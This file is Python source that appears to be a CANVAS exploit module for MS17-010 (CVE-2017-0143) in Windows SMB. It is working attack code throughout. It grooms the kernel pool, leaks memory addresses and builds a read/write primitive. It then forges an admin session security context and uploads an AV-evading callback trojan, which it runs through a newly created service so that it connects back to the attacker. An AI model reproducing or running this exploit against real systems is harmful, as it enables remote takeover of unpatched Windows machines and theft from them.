#!/usr/bin/env python

import sys
import os
import logging

import random
import time
import yaml
import struct
import StringIO

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from libs.canvasos import *
from libs import cstruct
from canvasexploit import canvasexploit
from exploitutils import standard_callback_commandline

import libs.newsmb.libsmb as libsmb
import libs.newsmb.svcctl as svcctl
from libs.newsmb.oem_string import *
from libs.newsmb.smb_string import *
from libs.newsmb.libdcerpc import DCERPC, DCERPCException

module_path = os.path.dirname(os.path.realpath(__file__))
with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']
DOCUMENTATION = metadata['DOCUMENTATION']
PROPERTY      = metadata['PROPERTY']


class SMBExploitClient(libsmb.SMBClient):
    def __init__(self, *args, **kwargs):
        super(SMBExploitClient, self).__init__(*args, **kwargs)
        self._mid = random.randint(1000, 10000)
        self.special_mid = 0
        self.last_mid    = 0

    def set_default_tid(self, tid):
        self.tid = tid

    def next_special_mid(self):
        self.special_mid = (self.next_last_mid() & 0xff00) + 0x100
        self.last_mid = self.special_mid

    def inc_last_mid(self):
        self.last_mid += 1
        return self.last_mid

    def next_last_mid(self):
        self.last_mid += 30
        self.last_mid = (self.last_mid + random.randint(1, 50)) & 0xffff
        return self.last_mid

    def build_nt_transact(self, fn, param, mid=None, setup='', data='', max_setup_count=None, total_parameter_count=None, total_data_count=None, max_parameter_count=None, max_data_count=None, data_offset=None):
        try:
            req = self.new_request(libsmb.SMB_COM_NT_TRANSACT, mid=mid, inc_mid=False)

            if max_setup_count is None:
                max_setup_count = len(setup)
            if total_parameter_count is None:
                total_parameter_count = len(param)
            if total_data_count is None:
                total_data_count = len(data)
            if max_parameter_count is None:
                max_parameter_count = total_parameter_count
            if max_data_count is None:
                max_data_count = total_data_count

            # Initialize the request parameters
            req.parameters['TotalParameterCount']  = total_parameter_count
            req.parameters['TotalDataCount']       = total_data_count
            req.parameters['MaxParameterCount']    = max_parameter_count
            req.parameters['MaxDataCount']         = max_data_count
            req.parameters['ParameterCount']       = len(param)
            req.parameters['DataCount']            = len(data)
            req.parameters['SetupCount']           = len(setup) / 2
            req.parameters['Function']             = fn
            req.parameters['Setup']                = USHORT_Array(setup)
            req.parameters['MaxSetupCount']        = max_setup_count

            # Initialize the request data
            req.data['NT_Trans_Parameters']       = UCHAR_Array(param)
            req.data['NT_Trans_Data']             = UCHAR_Array(data[:len(data)])

            # Finally, set the offsets of the data members
            req.parameters['ParameterOffset']     = req.offsetof_data('NT_Trans_Parameters')
            if data_offset is None:
                req.parameters['DataOffset']      = 0
            else:
                req.parameters['DataOffset']      = req.offsetof_data('NT_Trans_Data')
            return req
        except Exception as e:
            logging.error(str(e))

    def build_nt_transact_secondary(self, data, mid=None, setup='', param='', param_displacement=0, data_displacement=0, inc_mid=True):
        try:
            req = self.new_request(libsmb.SMB_COM_NT_TRANSACT_SECONDARY, mid=mid, inc_mid=inc_mid)

            # Initialize the request parameters
            req.parameters['TotalParameterCount']  = len(param)
            req.parameters['TotalDataCount']       = len(data)
            req.parameters['ParameterCount']       = len(param)
            req.parameters['DataCount']            = len(data)
            req.parameters['DataDisplacement']     = data_displacement
            req.parameters['ParameterDisplacement']= param_displacement

            # Initialize the request data
            req.data['Parameters']       = UCHAR_Array(param)
            req.data['Data']             = UCHAR_Array(data[:len(data)])

            # Finally, set the offsets of the data members
            req.parameters['ParameterOffset']     = 0
            if not len(data) and not len(param):
                req.parameters['DataOffset']      = 0
            elif not len(data) and len(param):
                req.parameters['ParameterOffset'] = 72
            else:
                req.parameters['DataOffset']      = 72 # req.offsetof_data('NT_Trans_Data') ## WHY???
            return req
        except Exception as e:
            logging.error(str(e))

    def build_transact(self, param, mid=None, data='', setup='', max_setup_count=None, total_parameter_count=None, total_data_count=None, max_parameter_count=None, max_data_count=None, parameter_offset=None):
        try:
            req = self.new_request(libsmb.SMB_COM_TRANSACTION, mid=mid, inc_mid=True)

            if max_setup_count is None:
                max_setup_count = len(setup)
            if total_parameter_count is None:
                total_parameter_count = len(param)
            if total_data_count is None:
                total_data_count = len(data)
            if max_parameter_count is None:
                max_parameter_count = total_parameter_count
            if max_data_count is None:
                max_data_count = total_data_count

            # Initialize the request parameters
            req.parameters['MaxSetupCount']       = max_setup_count
            req.parameters['TotalParameterCount'] = total_parameter_count
            req.parameters['TotalDataCount']      = total_data_count
            req.parameters['MaxParameterCount']   = max_parameter_count
            req.parameters['MaxDataCount']        = max_data_count
            req.parameters['ParameterCount']      = len(param)
            req.parameters['DataCount']           = len(data)
            req.parameters['Timeout']             = 0xffffffff
            req.parameters['SetupCount']          = len(setup) / 2
            req.parameters['Setup']               = USHORT_Array(0)

            # Finally, set the offsets of the data members
            if len(param):
                req.data['Trans_Parameters']      = UCHAR_Array(param)
                if parameter_offset is None:
                    req.parameters['ParameterOffset']  = req.offsetof_data('Trans_Parameters')
                else:
                    req.parameters['ParameterOffset']  = parameter_offset
            else:
                req.parameters['ParameterOffset']  = 0

            req.parameters['DataOffset']           = 0
            return req
        except Exception as e:
            logging.error(str(e))

    def build_write_andx(self, fid, data, mid=None, pid=None, tid=None, inc_mid=False):
        try:
            req = self.new_request(libsmb.SMB_COM_WRITE_ANDX, mid=mid, inc_mid=inc_mid)
            req.parameters['Fid'] = fid
            req.parameters['Offset'] = 0
            req.parameters['WriteMode'] = 4  # SMB_WMODE_WRITE_RAW_NAMED_PIPE
            req.parameters['Remaining'] = 12345  # can be any. raw named pipe does not use it
            req.parameters['DataLength'] = len(data)
            # print len(req.parameters) # 24 but not working
            req.parameters['DataOffset'] = 32 + 24 + 1 + 2 + 1 # WordCount(1), ByteCount(2), Padding(1)

            req.data['Data']             = UCHAR_Array(data[:len(data)])
            # req.data['Data'] = '\x00' + data # pad 1 byte

            return req
        except Exception as e:
            logging.error(str(e))

def ConvertToNetBiosPacketString(p, length=None):
    data = p.serialize()
    if length is None:
        length = len(data)
    return struct.pack('>BBH', 0, (length >> 16) & 0xFF, length & 0xffff) + data


class theexploit(canvasexploit, object):
    def __init__(self):
        super(theexploit, self).__init__()

        self.name               = NAME
        self.version            = VERSION
        self.setInfo(DESCRIPTION)
        self._handle            = file(module_path + os.path.sep + 'ms17_010.yaml', 'r')
        self.client             = None
        self.port               = 445
        self.is_64bit           = True
        self.arch               = "x64"

        self.username           = ""
        self.password           = ""
        self.pipename           = ""
        self.target_os          = None

        self.local_service_32   = "backdoors/win-simple-service-32.exe"
        self.local_service_64   = "backdoors/win-simple-service-64.exe"
        self.local_path         = os.path.abspath(os.path.dirname(__file__))

        randint                 = random.randint(0, 5000)
        self.service            = "SV%4.4d.EXE" % randint
        self.service_name       = "SV%4.4d" % randint
        self.callback_name      = "CB%4.4d.EXE" % randint
        self.local_callback     = os.path.join(self.local_path, self.callback_name)
        self.remote_callback    = "\\%s" % self.callback_name
        self.remote_service     = "\\%s" % self.service

        # Exploit specific parameters
        self.leak_attempts      = 12
        self.request_size       = 0x10d0 # MaxBufferSize (0x1104)
        self.pool_obj_size      = 0x500a
        self.frag_pool_size     = 0
        self.leak_size          = 0x150
        self.shift              = 0x200
        self.count              = 0x1000

        self.timeout            = 5

    def _load(self, arch):
        self._loader  = cstruct.CStructLoader(self._handle, arch)

    def getArgs(self):
        self.host = self.target.interface
        self.username = self.argsDict.get("username", self.username)
        self.password = self.argsDict.get("password", self.password)
        self.pipename = self.argsDict.get("pipename", self.pipename)
        self.port     = int(self.argsDict.get("port", self.port))

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def detect_arch(self):
        binding = "ncacn_ip_tcp:%s[135]" % self.host
        dce = DCERPC(binding, getsock=None)
        try:
            r = dce.bind('e1af8308-5d1f-11c9-91a4-08002b14a0fa', '3.0',
                         t_uuid='71710533-beba-4937-8319-b5dbef9ccc36', t_ver='1.0')
        except DCERPCException, e:
            logging.error("Error while detecting target architecture, assuming 64bit")
            return

        if not r:
            logging.warning("Detected 32bit arch")
            self.is_64bit = False
        else:
            logging.warning("Detected 64bit arch")

    def _test(self):
        logging.info('%s testing host %s:%s' % (self.name.lower(), self.host, self.port))

        with SMBExploitClient.from_address(self.host, self.port, username=self.username, password=self.password) as smb:
            smb.extended_security = True
            try:
                smb.negotiate()
            except libsmb.SMBNegotiationException as e:
                logging.critical("Error on negotiate (%s)" % e)
                return False
            try:
                smb.session_setup()
            except libsmb.SMBSessionSetupException as e:
                logging.critical("Error on session setup (%s)" % e)
                return False

            smb.tree_connect(u'IPC$')

            # Create a custom SMB_COM_TRANSACTION request
            setup = struct.pack("<HH", libsmb.TRANS_PEEK_NMPIPE, smb.fid)
            req   = smb.new_request(libsmb.SMB_COM_TRANSACTION)
            req.parameters['Setup']             = USHORT_Array(setup)
            req.parameters['SetupCount']        = len(setup) / 2
            req.parameters['MaxParameterCount'] = 0xD000
            req.parameters['MaxDataCount']      = 0xD000
            req.parameters['ParameterOffset']   = req.offsetof_data('Trans_Parameters')

            res = smb.send_recv_command(req)
            smb.tree_disconnect()
            return res.status == libsmb.STATUS_INSUFF_SERVER_RESOURCES

    def connect(self):
        try:
            self.client = SMBExploitClient.from_address(self.host, self.port, username=self.username, password=self.password)
        except libsmb.SMBConnectException as e:
            return False

        self.client.extended_security = True

        try:
            self.client.negotiate()
        except libsmb.SMBNegotiationException as e:
            logging.critical("Error on negotiate (%s)" % e)
            return False
        try:
            self.client.session_setup()
        except libsmb.SMBSessionSetupException as e:
            logging.critical("Error on session setup (%s)" % e)
            return False

        self.target_os = unicode(self.client.nativeos)
        return True

    def is_os_supported(self):
        logging.info("Target OS: %s" % self.target_os)
        if self.target_os.lower().startswith(("windows 7",
                                              "windows 8",
                                              "windows 10",
                                              "windows server 2008 r2",
                                              "windows server 2012",
                                              "windows server 2016")):
            return True

        logging.critical("Target OS is not currently supported (%s)" % self.target_os)
        return False

    def leak_frag_block_size(self):
        # Frag BlockSize leak - also used for discovering target architecture

        # 5 - NT_TRANS_RENAME
        mid = self.client.next_last_mid()
        req1 = self.client.build_nt_transact(5, struct.pack('<HH', self.client.fid, 0), mid=mid, data='A' * self.request_size, max_parameter_count=self.pool_obj_size)
        req1_str = ConvertToNetBiosPacketString(req1)
        req2 = self.client.build_nt_transact_secondary('A' * self.leak_size, mid=mid, inc_mid=False)
        req2_str = ConvertToNetBiosPacketString(req2)

        self.client.send_raw(req1_str[:-8])
        self.client.send_raw(req1_str[-8:] + req2_str)

        # Note: This is very important to account for the KHEAP activity!
        time.sleep(0.5)

        data = self.client.recv_raw(sz=self.request_size + self.leak_size)
        data = data[self.request_size:]

        try:
            if data.index("Frag") == 0xa8:
                logging.warning("32bit target confirmed (leak)")
                self.frag_pool_size = ord(data[data.index("Frag") - 2]) * 8
                self.is_64bit = False
                self.arch = 'x86'
            elif data.index("Frag") == 0xb0:
                logging.warning("64bit target confirmed (leak)")
                self.frag_pool_size = ord(data[data.index("Frag") - 2]) * 16
                self.is_64bit = True
        except ValueError as e:
            logging.critical("Frag pool tag not found")
            return False

        logging.debug("Frag pool BlockSize: 0x%x" % self.frag_pool_size)
        return True

    def align_and_leak(self):
        mid = self.client.next_last_mid()

        # leak next transaction
        # req1 = self.client.build_nt_transact(5, struct.pack('<HH', self.client.fid, 0), mid=mid, data='A' * self.request_size, max_parameter_count=15936)
        req1 = self.client.build_nt_transact(5, struct.pack('<HH', self.client.fid, 0), mid=mid, data='A' * self.request_size, max_parameter_count=self.groom_data_size - self.request_size)
        req1_str = ConvertToNetBiosPacketString(req1)
        req2 = self.client.build_nt_transact_secondary('A' * self.leak_size, mid=mid, inc_mid=False)
        req2_str = ConvertToNetBiosPacketString(req2)

        # control next transaction
        req3 = self.client.build_nt_transact(5, struct.pack('<HH', self.client.fid, 0), mid=self.client.fid, total_data_count=self.groom_data_size - self.count, max_parameter_count=self.count)
        req3_str = ConvertToNetBiosPacketString(req3)

        reqs = []
        for i in range(self.leak_attempts):
            mid  = self.client.inc_last_mid()
            req4 = self.client.build_transact(struct.pack('<HH', self.client.fid, 0), mid=mid, total_data_count=self.victim_data_size - self.shift, total_parameter_count=self.shift, max_data_count=0, max_parameter_count=0)
            req4_str = ConvertToNetBiosPacketString(req4)
            reqs.append(req4_str)

        self.client.send_raw(req1_str[:-8])
        self.client.send_raw(req1_str[-8:] + req2_str + req3_str + ''.join(reqs))

        data = self.client.recv_raw()
        # data += self.client.recv_raw()

        try:
            # Very important timer.
            time.sleep(0.3)
            data += self.client.recv_raw()
        except Exception as e:
            logging.error("An error on the info leak (%s)" % str(e))

        try:
            frag_offt = data.index("Frag") # 0x14b3
        except ValueError as e:
            logging.error("Missing 'Frag' tag")
            return False

        data = data[frag_offt - 4 + self.frag_pool_size:]

        # check pool tag and size value in buffer header
        expected_size = struct.pack('<H', self.victim_transaction_size)
        trans_offt_leak = self.info_x.valueof('pool_alignment') + self.info_x.valueof('srv_header_size')

        if data[0x4:0x8] != 'LStr' or data[self.info_x.valueof('pool_alignment'):self.info_x.valueof('pool_alignment') + 2] != expected_size or data[trans_offt_leak + 2:trans_offt_leak + 4] != expected_size:
            logging.error("Missing transaction struct in leak data")
            return False

        trans_leak = data[trans_offt_leak:]

        _, conn_address, session_address, treeconnect_address, flink_value = struct.unpack_from('<' + self.ptrf * 5, trans_leak, 8)
        inParameter = struct.unpack_from('<' + self.ptrf, trans_leak, self.transaction.offsetof('InParameter'))[0]
        leak_mid = struct.unpack_from('<H', trans_leak, self.transaction.offsetof('MultiplexID'))[0]

        next_page = (inParameter & 0xfffffffffffff000) + self.count
        if next_page + self.groom_pool_size + self.frag_pool_size + self.info_x.valueof('pool_alignment') + self.info_x.valueof('srv_header_size') + self.transaction.offsetof('_FLINK') != flink_value:
            logging.debug('Unexpected alignment (0x%x)' % (flink_value - next_page))
            return False

        self.connection      = conn_address
        self.session_address = session_address
        self.next_page       = next_page
        self.trans1_mid      = leak_mid
        self.trans1_address  = inParameter - self.transaction.size - 4
        self.trans2_address  = flink_value - self.transaction.offsetof('_FLINK')

        return True

    def _test_pipe(self, pipe):
        try:
            self.client.nt_create(name=pipe)
            self.client.close()
            return True
        except libsmb.SMBNTCreateException as e:
            return False

    def find_named_pipes(self):
        pipes = ['lsarpc',
                 'browser',
                 'netlogon',
                 'spoolss',
                 'samr']
        found = False

        self.client.tree_connect(u'IPC$')

        # See if passed named pipe works
        if self._test_pipe(self.pipename):
            found = True

        # If not, try list
        if not found:
            for p in pipes:
                if self._test_pipe(p):
                    self.pipename = p
                    found = True

        self.client.tree_disconnect()
        if found:
            logging.warning("Found named pipe (%s)" % self.pipename)
            return True

        return False

    def read_data(self, address, size):
        data = struct.pack('<' + self.ptrf * 3, self.trans2_address + self.transaction.offsetof('_FLINK'), self.trans2_address + self.shift, address)
        data += struct.pack('<II', 0, 0)
        data += struct.pack('<III', 8, 8, 8)
        data += struct.pack('<III', size, size, size)
        data += struct.pack('<HH', 0, 5)
        req = self.client.build_nt_transact_secondary(data, mid=self.trans1_mid, data_displacement=self.transaction.offsetof('OutParameter'), inc_mid=False)
        self.client.send_request(req)

        req = self.client.build_nt_transact(5, struct.pack('<HH', self.client.fid, 0), total_data_count=0x4000, total_parameter_count=self.count)
        self.client.send_request(req)
        time.sleep(0.5)

        req = self.client.build_nt_transact_secondary('', mid=self.trans2_mid, inc_mid=False)
        self.client.send_request(req)
        time.sleep(0.5)
        recv_data = self.client.recv_raw(sz=size + 8 + 115) # Account for trans2_addr + SMB+NT TRANSACT Headers
        recv_data = recv_data[115:]

        self.trans2_address = struct.unpack_from('<' + self.ptrf, recv_data)[0] - self.transaction.offsetof('_FLINK')

        req = self.client.build_nt_transact_secondary('', mid=self.trans1_mid, param=struct.pack('<' + self.ptrf, self.trans2_address), param_displacement=self.transaction.offsetof('InData'), inc_mid=False)
        self.client.send_request(req)
        time.sleep(0.5)

        req = self.client.build_nt_transact_secondary(struct.pack('<H', self.trans2_mid), mid=self.trans1_mid, data_displacement=self.transaction.offsetof('MultiplexID'), inc_mid=False)
        self.client.send_request(req)
        time.sleep(0.5)

        return recv_data[8:]

    def write_data(self, address, data):
        req = self.client.build_nt_transact_secondary(struct.pack('<' + self.ptrf, address), mid=self.trans1_mid, data_displacement=self.transaction.offsetof('InData'), inc_mid=False)
        self.client.send_request(req)
        time.sleep(0.5)

        req = self.client.build_nt_transact_secondary(data, mid=self.trans2_mid, inc_mid=False)
        self.client.send_request(req)
        time.sleep(0.5)

    def build_rw_primitive(self):
        #
        # CVE-2017-0143
        # aka eternalsynergy/romance, needs a leak primitive that works post win8
        # SMB_COM_WRITE_ANDX requires valid named pipe FID
        #
        # 1. Confusion FID/MID
        # if (Header->Command == SMB_COM_WRITE_ANDX) {
        #     targetOtherInfo = Fid;
        # } else {
        #     targetOtherInfo = SmbGetAlignedUshort( &Header->Mid );
        # }
        #
        # 2. SMB_COM_TRANSACTION_SECONDARY assumes InData points to the start of the buffer
        #    while SMB_COM_WRITE_ANDX updates InData to point to the end (confusion)
        #
        # 3. OOB Write
        #
        # 4. Just make a SYSTEM session and exec MOSDEF
        #
        self.client.tree_connect(u'IPC$')
        self.client.nt_create(name=self.pipename, desired_access=libsmb.FILE_WRITE_DATA)

        if not self.leak_frag_block_size():
            logging.critical("Leak failed")
            return False

        if self.is_64bit:
            self._load("x86-64")
            self.ptrf = "Q"
        else:
            self._load("x86")
            self.ptrf = "I"

        self.transaction   = self._loader.load('TRANSACTION')
        self.info_x        = self._loader.load('INFO')

        sz = self.pool_obj_size + self.info_x.valueof('srv_header_size') + self.info_x.valueof('pool_alignment')
        self.groom_pool_size = (sz + self.info_x.valueof('pool_alignment') - 1) & ~(self.info_x.valueof('pool_alignment') - 1)
        logging.debug("groom pool size: 0x%x" % self.groom_pool_size)

        self.groom_data_size  = self.pool_obj_size - 8 - self.transaction.size

        self.victim_pool_size  = self.count - (self.groom_pool_size & 0xfff) - self.frag_pool_size
        self.victim_transaction_size = self.victim_pool_size - (self.info_x.valueof('srv_header_size') + self.info_x.valueof('pool_alignment'))
        logging.debug("victim TRANSACTION size: 0x%x" % self.victim_transaction_size)

        self.victim_data_size = self.victim_transaction_size - 4 - self.transaction.size
        logging.debug("victim data size: 0x%x" % self.victim_data_size)

        leak_succeeded = False
        for i in range(self.leak_attempts):
            self.client.next_special_mid()
            if self.align_and_leak():
                leak_succeeded = True
                break

            logging.warning('Leak failed... trying again')
            self.client.close()
            self.client.tree_disconnect()

            self.client.tree_connect(u'IPC$')
            self.client.nt_create(self.pipename, desired_access=libsmb.FILE_WRITE_DATA)

        if not leak_succeeded:
            return False

        self.fid = self.client.fid

        mid = self.client.next_last_mid()
        req = self.client.build_write_andx(self.client.fid, 'A' * self.shift, mid=mid)
        req_str = ConvertToNetBiosPacketString(req)
        self.client.send_raw(req_str)

        inData = self.next_page + self.transaction.size + 8 + self.info_x.valueof('srv_header_size') + self.count + self.shift
        indata_next_trans_displacement = self.trans2_address - inData
        req = self.client.build_nt_transact_secondary('\x00', mid=self.client.fid, data_displacement=indata_next_trans_displacement + self.transaction.offsetof('MultiplexID'), inc_mid=False)
        self.client.send_request(req)

        time.sleep(0.5)

        # New Transaction with special mid should return STATUS_INVALID_SMB
        req = self.client.build_nt_transact(5, struct.pack('<HH', self.client.fid, 0), mid=self.client.special_mid)
        req_str = ConvertToNetBiosPacketString(req)
        self.client.send_raw(req_str)
        res = self.client.recv_response()

        res = self.client.recv_response()
        if res.status != libsmb.STATUS_INVALID_SMB:
            logging.error("Unexpected return status: 0x%x" % res.status)
            return False

        logging.warning("Successfully controlled a transaction")

        req = self.client.build_nt_transact_secondary(struct.pack('<' + self.ptrf, self.trans1_address), mid=self.client.fid, data_displacement=indata_next_trans_displacement + self.transaction.offsetof('InData'), inc_mid=False)
        self.client.send_request(req)
        time.sleep(0.5)

        req = self.client.build_nt_transact_secondary(struct.pack('<' + self.ptrf * 3, self.trans1_address, self.trans1_address + self.shift, self.trans2_address), mid=self.client.special_mid, data_displacement=self.transaction.offsetof('InParameter'), inc_mid=False)
        self.client.send_request(req)
        time.sleep(0.5)

        self.trans2_mid = self.client.next_last_mid()
        req = self.client.build_nt_transact_secondary(struct.pack('<H', self.trans2_mid), mid=self.trans1_mid, data_displacement=self.transaction.offsetof('MultiplexID'), inc_mid=False)
        self.client.send_request(req)

        return True

    def upgrade_session(self):
        logging.info("Upgrading SMB session")
        if self.target_os.lower().startswith("windows 7") or self.target_os.lower().startswith("windows server 2008 r2"):
            logging.info("Loading %s SESSION_INFO for Windows 7" % self.arch)
            self.session_info = self._loader.load('SESSION', version='7')
        else:
            logging.info("Loading %s SESSION_INFO for Windows 8+" % self.arch)
            self.session_info = self._loader.load('SESSION', version='8')

        self.write_data(self.session_address + self.session_info.offsetof('IsNullSession'), '\x00')
        self.write_data(self.session_address + self.session_info.offsetof('IsAdmin'), '\x01')

        session_data = self.read_data(self.session_address, 0x100)
        security_context_addr = struct.unpack_from('<' + self.ptrf, session_data, self.session_info.offsetof('security_context'))[0]

        security_context_data  = self.read_data(security_context_addr, self.session_info.valueof('security_context_size'))

        logging.info("Overwriting session security context")
        fake_security_context = self.session_info.valueof("fake_security_context")
        self.write_data(security_context_addr, struct.pack(*fake_security_context))

        # Quick test
        self.client.tree_connect(u'C$')
        s = StringIO.StringIO()
        s.write("VAS")

        self.client.put(s, '\\ed.txt')
        r = self.client.dir('\\ed.txt')
        if r:
            logging.warning("Session upgraded")
            self.client.delete('\\ed.txt')
            return True

        return False

    def create_native_callback(self):
        """
        Build a MOSDEF callback binary
        """
        if not self.callback:
            logging.error('No callback set')
            return False

        try:
            t_os = canvasos('Windows')
            t_os.arch = self.arch.upper()

            try:
                # Now that we have av_bypass encrypted is not needed
                ret = self.buildmosdeftrojan(self.callback.ip,
                                             self.callback.port,
                                             target_os=t_os,
                                             universal=True,
                                             #encrypted=True,
                                             av_bypass=True
                                            )
            except Exception as e:
                logging.error("Error while building MOSDEF callback: %s" % (str(e)))
                return False

            # write out the binary
            logging.info('Writing callback trojan to %s' % self.local_callback)
            fd = open(self.local_callback, 'wb')
            fd.write(self.mosdeftrojan)
            fd.close()
        except Exception as e:
            logging.error("An error occurred while generating mosdef callback (%s)" % str(e))
            return False

        return True

    def exec_ps_callback(self):
        return False

    def exec_native_callback(self):
        logging.info("Uploading and executing a privileged MOSDEF callback")

        # Upload our callback
        f = file(self.local_callback, 'r')
        self.client.put(f, self.remote_callback)
        f.close()

        # Upload our service
        if self.is_64bit:
            f = file(self.local_service_64, 'r')
        else:
            f = file(self.local_service_32, 'r')
        self.client.put(f, self.remote_service)
        f.close()

        # Setup dcerpc/svcctl in order to reuse our upgraded SMB connection
        binding = u'ncacn_np:%s[\\svcctl]' % self.host
        dce = DCERPC(binding, getsock=None, smb_client=self.client)
        svc = svcctl.SVCCTLClient(self.host, dce=dce)
        svc.dce.bind(svc.uuid[0], svc.uuid[1])

        # Create service
        try:
            handle = svc.open_manager()
            svc.create_service(handle=handle,
                               service_name=self.service_name,
                               binary_pathname=self.remote_service,
                               display_name=self.service_name,
                               start_type=svcctl.SVCCTL_SERVICE_AUTO_START)
        except svcctl.SVCCTLCreateServiceException as e:
            logging.error('Error while creating service (%s)' % str(e))
            return False
        else:
            logging.info("Service has been created successfully (%s)" % self.service_name)

        try:
            service_handle = svc.open_service(self.service_name)
        except svcctl.SVCCTLCreateServiceException as e:
            logging.critical('svc.open_service() failed (%s)' % str(e))
            return False

        # Start service
        try:
            svc.start_service(service_handle, args=[self.remote_callback])
        except svcctl.SVCCTLCreateServiceException as e:
            logging.critical("Service could not be started (%s)" % str(e))
            return False

        # Close everything
        svc.close_service(service_handle)
        svc.close_manager()
        return True

    def cleanup_native(self):
        # Setup dcerpc/svcctl in order to reuse our upgraded SMB connection
        binding = u'ncacn_np:%s[\\svcctl]' % self.host
        dce = DCERPC(binding, getsock=None, smb_client=self.client)
        svc = svcctl.SVCCTLClient(self.host, dce=dce)
        svc.dce.bind(svc.uuid[0], svc.uuid[1])

        logging.info("Stopping service (%s)" % self.service_name)

        try:
            service_handle = svc.open_service(self.service_name)
            svc.stop_service(service_handle)

            # We allow up to 5s for the service to stop
            logging.info("Sleeping for %ds" % self.timeout)
            for i in range(0, self.timeout):
                ret = svc.query_service(service_handle)
                if ret['CurrentState'] == svcctl.SVCCTL_SERVICE_STOPPED:
                    break
                time.sleep(1)
        except Exception as e:
            logging.error("Failed to stop service (%s)" % str(e))
        else:
            logging.info("Service has been stopped successfully")

        logging.info("Deleting service (%s)" % self.service_name)

        try:
            service_handle = svc.delete_service(service_name=self.service_name)
            svc.close_service(service_handle)
        except Exception as e:
            logging.critical("Error while deleting service (%s)" % str(e))
            return False
        else:
            logging.info("Service (%s) has been deleted successfully" % self.service_name)

        return True

    def clean_local_files(self):
        if os.path.exists(self.local_callback):
            os.remove(self.local_callback)

    def run(self):
        self.getArgs()
        # Fix to allow accounts without password
        # if not self.username or not self.password or not self.port:
        if not self.username or not self.port:
            logging.critical("Missing mandatory arguments")
            return False

        try:
            if not self._test():
                logging.critical("Target does not appear to be vulnerable")
                return False
        except Exception as e:
            logging.error("An error occurred testing if the target is vulnerable (%s)" % str(e))
            return False


        logging.warning("Target (%s) is vulnerable" % self.host)
        self.detect_arch()

        if not self.connect():
            logging.critical("Error while connecting to %s:%s" % (self.host, self.port))
            return False

        if not self.is_os_supported():
            logging.critical("Exiting")
            return False

        if not self.find_named_pipes():
            logging.critical("Could not find any accessible named pipe, exiting")
            return False

        if not self.build_rw_primitive():
            logging.critical("Error while building rw primitive")
            return False

        if not self.upgrade_session():
            logging.critical("Error while upgrading SMB session")
            return False

        if not self.create_native_callback():
            logging.critical("Error while creating native callback")
            return False

        if not self.exec_native_callback():
            logging.critical("Error while uploading and executing native callback")
            return False

        self.clean_local_files()

        time.sleep(5)
        if self.ISucceeded():
            logging.warning("Exploit succeeded")
        else:
            logging.critical("Exploit failed")

        if not self.cleanup_native():
            logging.critical("Error during service cleanup")

        return self.succeeded


if __name__=='__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (NAME, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
